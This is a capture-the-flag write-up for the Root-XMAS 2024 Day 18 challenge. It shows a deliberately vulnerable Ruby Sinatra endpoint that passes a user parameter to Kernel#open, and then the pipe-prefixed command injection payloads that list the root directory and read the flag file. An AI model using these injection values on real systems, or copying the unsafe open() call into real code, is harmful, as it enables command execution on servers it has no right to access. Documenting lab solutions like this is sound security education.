---
title: Root-XMAS 2024 Day 18 - Santa's sweet words
feed: hide
permalink: /RootXMAS_2024_18
date: 18-12-2024
summary: Open sesame
---
### summary

`open` in ruby does a lot of things... including executing commands!

### recon

We have a small web page where we can get some quotes from Santa, and we can also download the source of the chall. It's a small Ruby script, so let's put it below in it's entirety:

```ruby
require 'sinatra'

set :bind, '0.0.0.0'
set :show_exceptions, false
set :environment, :production

get '/' do
  send_file File.join(settings.public_folder, 'index.html')
end

get '/love' do
    send_file File.join(settings.public_folder, 'love.html')
end

get '/api/message' do
  number = params[:number]

  file_name = "#{number}.txt"

  content = open(file_name, "rb") { |f| f.read }
  content_type 'application/octet-stream'
  attachment file_name
  body content
end

get '/source' do
  content_type 'text/plain'
  File.read(__FILE__)
end

```

### solution

The interesting endpoint is of course `/api/message` with the `number` parameter, which allows us to read any ".txt" file... but we don't know where is the flag!
if we try to access https://day18.challenges.xmas.root-me.org/api/message?number=flag , we get an `500 Internal error` response 

The juicy lines are:

```ruby
  file_name = "#{number}.txt"
  content = open(file_name, "rb") { |f| f.read }
```

So, not knowing much about Ruby, let's RTFM: [man open](https://apidock.com/ruby/Kernel/open) . Extract:

> *(You can) Open a subprocess and read its output:*
```ruby
cmd = open("|date")
print cmd.gets
cmd.close
```

Oookay... that's a little bit too powerful and dangerous, but useful for us! 
So let's try with any linux command:

```
?number=| ls / ;
	bin
	...
	flag-ruby-expert.txt
	...
```

and we can get the flag!

```
?number=|cat /flag-ruby-expert.txt ;

	RM{Why_d0esn't_Open_Ju5t_Op3n_in_rUbY??}
```


| Previous day | [[Day 17 - Ghost in the shell]]           |
| ------------ | ----------------------------------------- |
| Next day     | [[Day 22 - The date is near]] (timeskip!) |